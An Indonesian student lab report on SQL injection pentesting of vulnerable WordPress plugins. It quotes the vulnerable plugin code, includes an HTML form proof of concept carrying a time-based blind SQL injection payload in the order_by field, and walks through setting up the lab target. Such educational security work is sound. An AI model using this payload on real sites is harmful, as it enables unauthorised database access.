##### TUGAS 2 PKSJ
# Penetration Testing : SQL Injection
## Pendahuluan
SQL (Structured Query Language) merupakan suatu bahasa (language) yang digunakan untuk mengakses data di dalam sebuah database relasional. 
SQL sering juga disebut dengan istilah query, dan bahasa SQL secara praktiknya digunakan sebagai bahasa standar untuk manajemen database 
relasional. Hingga saat ini hampir seluruh server database atau software database mengenal dan mengerti bahasa SQL.
Karena database merupakan asset yang vital dan rawan untuk diserang maka penting untuk menjaga keamanan dari database tersebut.
Salah satu celah yang bisa digunakan oleh penyerang untuk mengakses database adalah melalui SQL Injection.
SQL injection adalah sebuah aksi hacking yang dilakukan di aplikasi client dengan cara memodifikasi perintah SQL yang ada di memori aplikasi client.
Tidak adanya penanganan terhadap karakter – karakter tanda petik satu ‟ dan juga karakter double minus -- yang menyebabkan suatu aplikasi dapat disisipi
dengan perintah SQL. Sehingga seorang Hacker menyisipkan perintah SQL kedalam suatu parameter maupun suatu form.

Dalam simulasi kali ini akan dilakukan percobaan simulasi SQL injection pada plugin wordpress yang vurnerable menggunakan sqlmap dan WPscan.

###### Anggota Kelompok :
| Nama        | NRP         |
|:-------------:|:-----:|
M Rasyid Karomi  |  5114100101
Miftakhul Akhyar |  5114100143
Faiq Firdausi    |  5114100165

## Dasar Teori
### Operating System
Sistem operasi (Operation System) adalah perangkat lunak (software) yang mengatur seluruh sumber daya dalam komputer.
Sistem operasi menjadi salah satu aspek penting dalam keamanan jaringan termasuk didalamnya kestabilan system, vurnerability dan 
ketersediaan tools keamanan pada operating system.
Pada pengujian ini akan digunakan dua Operating System yaitu Ubuntu Server dan Kali Linux.

#### Ubuntu Server
Linux Ubuntu Server adalah system operasi turunan dari Linux Ubuntu yang di desain khusus dengan kernel 
yang telah dikustomisasi untuk bekerja sebagai system operasi server. Kernel Linux Ubuntu Server di desain 
khusus untuk bisa bekerja dengan lebih dari satu proses (multiprocessor) dan menggunakan pennjadwalan deadline I/O.
Ubuntu Server dipilih untuk simulasi penetration testing karena Ubuntu Server memiliki lisensi open source dan merupakan
distro yang banyak digunakan untuk server serta merupakan turunan dari distro linux debian sehingga memiliki 
keamanan yang cukup tinggi. 

#### Kali Linux
Kali Linux adalah distribusi berlandasan distribusi Debian GNU/Linux untuk tujuan forensik digital dan di gunakan untuk pengujian 
penetrasi, yang dipelihara dan didanai oleh Offensive Security. Kali juga dikembangkan oleh  Offensive Security sebagai penerus BackTrack
Linux. Kali menyediakan pengguna akses yang mudah terhadap koleksi tools yang lengkap dan komprehensif untuk pengujian keamanan atau penetration testing.
Hal tersebut menjadi dasar memilih distro ini untuk digunakan sebagai OS penetration tester pada simulasi ini. Kali merupakan platform yang 
mendukung Metasploit Framework dari Proyek Metasploit, berupa alat untuk mengembangkan dan melaksanakan kode eksploit terhadap <i>remote host</i>. 
Distro ini juga menyertakan tools keamanan yang lengkap termasuk Wireshark, Ncrack, medusa, Nmap dan Aircrack-ng.

### Wordpress
WordPress adalah sebuah aplikasi sumber terbuka (open source) yang sangat populer digunakan sebagai mesin blog (blog engine). WordPress dibangun dengan bahasa pemrograman PHP dan basis data (database) MySQL. PHP dan MySQL, keduanya merupakan perangkat lunak sumber terbuka (open source software). Selain sebagai blog, WordPress juga mulai digunakan sebagai sebuah CMS (Content Management System) karena kemampuannya yang dapat dimodifikasi dan disesuaikan dengan kebutuhan penggunanya.

#### Video Player 1.5.16
Merupakan plugin Wordpress untuk menambahkan, mengatur dan menampilkan video.

###### Vulnerability
Celah keamanan wordpress ini terletak pada fungsi `show_tag()`, `spider_video_select_playlist()`, `spider_video_select_video()`.
```php
show_tag():
 
[...]
    
if (isset($_POST['page_number'])) {
   if ($_POST['asc_or_desc']) {
      $sort["sortid_by"] = esc_sql(esc_html(stripslashes($_POST['order_by'])));
      if ($_POST['asc_or_desc'] == 1) {
         $sort["custom_style"] = "manage-column column-title sorted asc";
         $sort["1_or_2"] = "2";
         $order = "ORDER BY " . $sort["sortid_by"] . " ASC";
      } else {
         $sort["custom_style"] = "manage-column column-title sorted desc";
         $sort["1_or_2"] = "1";
         $order = "ORDER BY " . $sort["sortid_by"] . " DESC";
      }
   }
 
 
spider_video_select_playlist():
[...]
if(isset($_POST['page_number']))
{
   if($_POST['asc_or_desc'])
   {
      $sort["sortid_by"]=esc_sql(esc_html(stripslashes($_POST['order_by'])));
      if($_POST['asc_or_desc']==1)
      {
         $sort["custom_style"]="manage-column column-title sorted asc";
         $sort["1_or_2"]="2";
         $order="ORDER BY ".$sort["sortid_by"]." ASC";
      }
      else
      {
         $sort["custom_style"]="manage-column column-title sorted desc";
         $sort["1_or_2"]="1";
         $order="ORDER BY ".$sort["sortid_by"]." DESC";
      }
   }
function spider_video_select_video():
 
[...]
    
if(isset($_POST['page_number']))
{
      if($_POST['asc_or_desc'])
      {
         $sort["sortid_by"]=esc_html(stripslashes($_POST['order_by']));
         if($_POST['asc_or_desc']==1)
         {
            $sort["custom_style"]="manage-column column-title sorted asc";
            $sort["1_or_2"]="2";
            $order="ORDER BY ".esc_sql($sort["sortid_by"])." ASC";
         }
         else
         {
            $sort["custom_style"]="manage-column column-title sorted desc";
            $sort["1_or_2"]="1";
            $order="ORDER BY ".esc_sql($sort["sortid_by"])." DESC";
         }
      }
}
```

Developer mencoba mengatisipasi SQL Injection dengan menggunakan `esc_sql` namun nilai input post digunakan pada klausal `ORDER_BY` yang penggunaannya tanpa menggunakan tanda kutip sehingga memungkinkan untuk menyisipkan perintah query walaupun sudah diantisipasi dengan `esc_sql`.

###### Kode Pada User Input
```html
<html>
   <body>
      <form action="http://<target>/wp-admin/admin-ajax.php?action=spiderVeideoPlayerselectplaylist" method="POST">
         <input type="hidden" name="search_events_by_title" value="" />
         <input type="hidden" name="page_number" value="0" />
         <input type="hidden" name="serch_or_not" value="" />
         <input type="hidden" name="asc_or_desc" value="1" />
         <input type="hidden" name="order_by" value="(CASE WHEN (SELECT sleep(10)) = 1 THEN id ELSE title END) ASC #" />
         <input type="hidden" name="option" value="com_Spider_Video_Player" />
         <input type="hidden" name="task" value="select_playlist" />
         <input type="hidden" name="boxchecked" value="0" />
         <input type="hidden" name="filter_order_playlist" value="" />
         <input type="hidden" name="filter_order_Dir_playlist" value="" />
         <input type="submit" value="Submit request" />
      </form>
   </body>
</html>
```

Link Plugin : [ [https://wordpress.org/plugins/player/developers/](https://wordpress.org/plugins/player/developers/) ]

#### League Manager 3.9.1.1
Merupakan plugin Wordpress untuk menampilkan dan memanajemen liga olahraga.

Link Plugin : [ [https://wordpress.org/plugins/leaguemanager/developers/](https://wordpress.org/plugins/leaguemanager/developers/) ]

#### CP Reservation Calendar 1.1.6
Merupakan plugin untuk melakukan reservasi berbasis kalender yang bisa digunakan untuk reservasi hotel, penyewaan mobil, penyewaan kantor jasa wisata dan lain sebagainya.

###### Vulnerability
Celah keamanan wordpress ini terletak pada file `dex_reservations.php`

```php
function dex_reservations_get_option ($field, $default_value)
{
    global $wpdb, $dex_option_buffered_item, $dex_option_buffered_id;
    if ($dex_option_buffered_id == CP_CALENDAR_ID)
        $value = $dex_option_buffered_item->$field;
    else
    {
       $myrows = $wpdb->get_results( "SELECT * FROM ".DEX_RESERVATIONS_CONFIG_TABLE_NAME." WHERE id=".CP_CALENDAR_ID );
       $value = $myrows[0]->$field;
       $dex_option_buffered_item = $myrows[0];
       $dex_option_buffered_id  = CP_CALENDAR_ID;
    }
    if ($value == '' && $dex_option_buffered_item->calendar_language == '')
        $value = $default_value;
    return $value;
}
```
Pada fungsi diatas variabel `CP_CALENDAR_ID` herusnya bernilai integer namun tidak ada fungsi atau blok kode untuk memvalidasi variabel tersebut.

Link Plugin : [ [https://wordpress.org/plugins/cp-reservation-calendar/](https://wordpress.org/plugins/cp-reservation-calendar/) ]

### Attacking Tools
#### mitmproxy
mitmproxy merupakan tool untuk melakukan intercept request proxy HTTP SSL berkemampuan interaktif, yang memungkinkan user untuk mengamati, memodifikasi dan memutar ulang request dan response dengan cepat.
#### WPScan
Merupakan tool berfungsi untuk memindai tingkat atau masalah keamanan dari CMS (Content Management System) Wordpress.
#### sqlmap
Merupakan tool opensource yang mendeteksi dan melakukan exploit pada bug SQL injection secara otomatis. dengan melakukan serangan SQL injection seorang attacker dapat mengambil alih serta memanipulasi sebuah database di dalam sebuah server. 
#### BBQsql
Merupakan framework Blind SQL Injection yang ditulis dalam bahasa python. BBQSQL juga merupakan alat semi otomatis, memungkinkan sedikit penyesuaian untuk yang sulit memicu temuan injeksi SQL. Memiliki UI yang intuitif untuk membuat serangan lebih mudah dilakukan. Python gevent juga diimplementasikan, membuat performa BBQSQL sangat cepat.

--------------
Jangan Lupa Screenshot
--------------
## Proses Instalasi
### Instalasi Objek Serangan
#### Insstalasi MySQL Server

```
apt-get install mysql-server
```

![1 install mysql-server](https://user-images.githubusercontent.com/24241201/32403084-7966954e-c164-11e7-947e-bcf72f4a40e8.JPG)

kemudian jalankan mysql

![2 start mysql](https://user-images.githubusercontent.com/24241201/32403085-79e8ba7e-c164-11e7-9c48-262091084fd1.JPG)

#### Buat Database Wordpress

```
CREATE DATABASE wordpress;
```

![3 create database wordpress](https://user-images.githubusercontent.com/24241201/32403086-7a9133de-c164-11e7-8469-33ea4f041963.JPG)

#### Buat User baru di mysql untuk mengoperasikan

```
CREATE USER <newuser@localhost> IDENTIFIED BY 'newuser'
```

![3 2 create new user mysql](https://user-images.githubusercontent.com/24241201/32403088-7ae36a96-c164-11e7-9a5b-40646ca59e2e.JPG)

#### Flush aturan hak akses

```
FLUSH PRIVILEGES
```

![3 3 flush aturan hak akses](https://user-images.githubusercontent.com/24241201/32403089-7b612300-c164-11e7-96ec-ba408522ebaa.JPG)

#### Install php

```
apt-get install php7.0 php7.0-mysql libapache2-mod-php7.0 php7.0-cli php7.0-cgi php7.0-gd
```

![4 install php](https://user-images.githubusercontent.com/24241201/32403090-7ba54526-c164-11e7-81a8-d3cb4e52bd92.JPG)

#### Download wordpress

```
wget http://wordpress.org/latest.tar.gz
```

![5 download wordpress](https://user-images.githubusercontent.com/24241201/32403091-7c01b676-c164-11e7-9c70-d2f99eb3e025.JPG)

pastikan file telah terdownload dengan benar

![6 file wordpress telah didownload latest tar gz](https://user-images.githubusercontent.com/24241201/32403092-7c7a0392-c164-11e7-813c-383366c4b390.JPG)

#### Ekstrak file wordpress yang tadi telah didownload

```
tar xzvf latest.tar.gz
```

![7 ekstrak file latest](https://user-images.githubusercontent.com/24241201/32403093-7cf910a6-c164-11e7-8345-8a93c0881148.JPG)

kemudian akan keluar folder bernama wordpress

![8 maka muncul folder wordpress](https://user-images.githubusercontent.com/24241201/32403094-7daa1f04-c164-11e7-83c1-142963a3db63.JPG)

#### Salin default config (wp-config-sample.php) kedalam file dengan judul (wp-config.php)

file wp-config.php ini nantinya akan kita ubah-ubah konfigurasinya

```
cp wp-config-sample.php wp-config.php
```

![9 copy default config config sample](https://user-images.githubusercontent.com/24241201/32403095-7e3e9f12-c164-11e7-8c98-71df308b4fab.JPG)

#### Edit Konfigurasi wp-config.php

Ubah nilai dari 'DB_NAME', 'DB_USER', dan 'DB_PASSWORD', sesuaikan dengan nama user, password, dan database yang telah dibuat sebelumnya

![11 konfigurasi wp-config php setelah diedit](https://user-images.githubusercontent.com/24241201/32403097-7f479904-c164-11e7-8afa-c28114ed1890.JPG)


#### Copy wordpress ke folder /var/www/html/

```
rsync -avP wordpress /var/www/html/
```

![12 copy wordpress ke var www html](https://user-images.githubusercontent.com/24241201/32403098-7fcbb338-c164-11e7-8ebc-2090a6a16420.JPG)

#### Ubah hak kepemilikan user

dalam kasus ini, hak kepemilikan jadi user faiq

```
chown -R faiq *
```

![13 ubah hak kepemilikan jadi user faiq](https://user-images.githubusercontent.com/24241201/32403099-803e4a7e-c164-11e7-88d2-f5a96de5aa47.JPG)

#### Buat direktori upload

kemudian jangan lupa untuk mengubah kepemilikannya juga

```
mkdir wp-content/uploads
sudo chown -R faiq:www-data wp-content/uploads
```

![14 buat direktori upload dan ubah kepemilikan user jadi faiq](https://user-images.githubusercontent.com/24241201/32403100-80d4aea6-c164-11e7-9171-26aa1bc9a471.JPG)

maka apabila dibuka tampilan halaman admin wordpress, akan seperti ini

![15 tampilan admin wordpress](https://user-images.githubusercontent.com/24241201/32403101-8136909e-c164-11e7-9ddf-68ecfb672867.JPG)

#### Download League Manager 3.9.1.1

Pilih versi ke 3.9.1.1 kemudian klik Download

![16 download league manager 9 1 1](https://user-images.githubusercontent.com/24241201/32403102-81763c62-c164-11e7-8e54-f8cebf20beda.JPG)

#### Ubah settingan di file php.ini

Ubah upload_max_filesize jadi 64M

![17 ubah setingan di php ini max upload jadi 64 mega](https://user-images.githubusercontent.com/24241201/32403103-81c1aae4-c164-11e7-874d-9f0601e573d9.JPG)

#### Upload plugin

klik Pilih File, kemudian pilih league manager yang tadi telah kita download

![18 upload plugin](https://user-images.githubusercontent.com/24241201/32403105-82100540-c164-11e7-90d0-4fde589207fe.JPG)

kemudian apabila telah terupload, akan muncul sebagai berikut 

![19 plugin league managere telah terupload](https://user-images.githubusercontent.com/24241201/32403073-7653aeaa-c164-11e7-8762-f5649be6dfd0.JPG)

#### Buat League Baru

klik League Manager, isi nama League kemudian klik Add League 

![20 buat liga baru leauge master](https://user-images.githubusercontent.com/24241201/32403074-76bdc4f2-c164-11e7-83aa-133ee7957d72.JPG)

#### Buat Season

Setelah membuat league akan keluar tampilan seperti dibawah, kemudian isi kolom Season dan Number of Match Days

![21 buat season liga](https://user-images.githubusercontent.com/24241201/32403075-76fafb38-c164-11e7-9298-9b7ddce08f78.JPG)

#### Buat Tim

Setelah membuat season akan keluar tampilan seperti dibawah, kemudian buat tim dengan cara mengisi kolom-kolom berikut

![22 buat tim](https://user-images.githubusercontent.com/24241201/32403076-7738e9ca-c164-11e7-9ff0-533e9621966f.JPG)

#### Buat Match

Setelah membuat beberapa tim, tentunya dibutuhkan juga membuat match. Isi sesuai jadwal match yang diinginkan

![23 buat match](https://user-images.githubusercontent.com/24241201/32403077-778796e2-c164-11e7-87b9-21006eeb04f2.JPG)

#### Install Wordpress video player

Install plugin Spider Video Player, apabila sudah terinstall sebelumnya, maka pada plugins akan muncul sebagai berikut

![24 install wordpress video player 1 5 16](https://user-images.githubusercontent.com/24241201/32403078-77cc2c12-c164-11e7-80fa-9889af11cb1c.JPG)

#### Menambahkan player untuk menambah video

Untuk menambahkan player, klik Add a Player

![25 menambahkan player untuk menambah video](https://user-images.githubusercontent.com/24241201/32403079-780f4704-c164-11e7-9a47-debca906622b.JPG)

Kemudian akan muncul sebagai berikut,
Set priority menjadi Flash, isi title, pilih theme, lalu klik Add button

![26 set priority title dan playlist](https://user-images.githubusercontent.com/24241201/32403080-784f702c-c164-11e7-8b14-9de540c5ebf9.JPG)

#### Beri video pada post Hello World

Buka post Hello World, edit, kemudian tambahkan video di dalam post tersebut

```
[Spider_Video_Player id="1"]
```

![27 edit hello world post dan tambahkan video player](https://user-images.githubusercontent.com/24241201/32403081-78939432-c164-11e7-8109-242f526013b6.JPG)

#### Install CP Reservation Calendar

Install plugin CP Reservation Calendar, apabila sudah terinstall sebelumnya, maka pada plugins akan muncul sebagai berikut

![28 install cp reservation callendar](https://user-images.githubusercontent.com/24241201/32403082-78d15f56-c164-11e7-88d9-8f451585c0a3.JPG)

#### Buat post baru untuk Reservation Calendar

Pada post tersebut isi sebagai berikut

```
[CP_RESERVATION_CALENDAR]
```

![29 buat post reservation callendar](https://user-images.githubusercontent.com/24241201/32403083-791a8bae-c164-11e7-99e4-46bf40042e55.JPG)


### Instalasi Attacking Tools
Karena tools WPscan, sqlmap dan BBQsql merupakan tools yang default sudah terinstall pada Kali Linux maka tidak diperlukan proses instalasi.
